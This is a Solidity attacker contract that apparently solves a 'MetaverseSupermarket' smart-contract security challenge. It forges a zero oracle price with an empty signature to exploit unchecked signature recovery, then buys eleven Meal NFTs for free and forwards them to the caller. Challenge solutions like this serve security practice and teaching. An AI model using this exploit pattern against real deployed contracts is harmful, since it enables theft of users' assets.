// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Challenges/MetaverseSupermarket.sol";

contract MetaverseSupermarketAttacker {
    InflaStore public market;

    constructor(address _marketAddress) {
        market = InflaStore(_marketAddress);
    }

    function attack() public {
        Meal meal = market.meal();

        OraclePrice memory oraclePrice;
        oraclePrice.blockNumber = block.number;
        oraclePrice.price = 0;

        Signature memory signature;
        signature.r = bytes32("");
        signature.s = bytes32("");
        signature.v = 27;

        for (uint8 i = 0; i < 11; i++) {
            market.buyUsingOracle(oraclePrice, signature);
            meal.transferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}
